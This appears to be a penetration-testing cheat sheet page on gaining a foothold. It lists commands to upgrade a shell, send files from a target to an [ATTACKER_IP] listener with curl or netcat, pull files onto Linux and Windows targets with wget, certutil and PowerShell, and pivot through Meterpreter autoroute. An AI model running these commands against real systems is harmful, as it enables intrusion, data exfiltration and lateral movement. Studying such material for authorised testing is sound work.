---
title: 4 - Foothold
---

# Spawn Better Shell

---

### PYTHON


 > 
 > **<font color=red>python3 -c 'import pty; pty.spawn("/bin/bash")';export TERM=xterm</font>**</br>
 > `Ctrl + Z`</br>
 > **<font color=red>stty raw -echo; fg</font>**</br>
 > Spawn a better shell (tab, history, ...).

# Extract File from Target

---

### CURL


 > 
 > **<font color=red>curl</font> \[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red> -F 'data=@</font>fmyFile<font color=red>'</font>**</br>
 > Send myFile to an netcaat listener.

# Upload File on Target

---

### NETCAT


 > 
 > **<font color=red>nc -l -p </font>\[ATTACKER_PORT\] <font color=red>\></font> newFile**</br>
 > Run on Target.

 > 
 > **<font color=red>nc -w -3</font> \[ATTACKER_IP\] \[ATTACKER PORT\] <font color=red>\<</font> myFile**</br>
 > Run on Attacker machine. Send a file on the target.

---

### PYTHON


 > 
 > **<font color=red>python3 -m http.server</font> \[ATTACKER_PORT\]**</br>
 > Run on attacker machine (at the file location).

 > 
 > **<font color=red>wget http://</font>\[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red>/myFile</font>**</br>
 > Get the file on a Linux target machine.

 > 
 > **<font color=red>certutil.exe -urlcache -f http://</font>\[ATTACKER_IP\]:\[ATTACKER_PORT\]<font color=red>/</font>myFile myFile**</br>
 > or</br>
 > **<font color=red>powershell -c wget "http://</font>\[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red>/</font>myFile<font color=red>" -outfile "</font>myFile<font color=red>"</font>**</br>
 > or</br>
 > **<font color=red>powershell -c "(new-object System.Net.WebClient).Downloadfile('http://</font>\[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red>/</font>myFile<font color=red>', '</font>myFile<font color=red>')"</font>**</br>
 > Get the file on a Windows target machine.

---

### MIMIKATZ


 > 
 > **<font color=red>upload</font> myFile**</br>
 > Transfer file to target.

---

### METERPRETER


 > 
 > **<font color=red>upload</font>**</br>
 > Upload a file or directory.

 > 
 > **<font color=red>download</font>**</br>
 > Download a file or directory.

# Pivoting

---

### METERPRETER

When we have a meterpreter shell on a machine that has access to another network, we can use it to gain access to the 2nd network.

 > 
 > **<font color=red>run autoroute -s</font> \[REMOTE_NETWORK\]<font color=red>/24</font>**</br>
 > Create a route via the host that we had access to.

 > 
 > **<font color=red>run autoroute -p</font>**</br>
 > Show added routes.
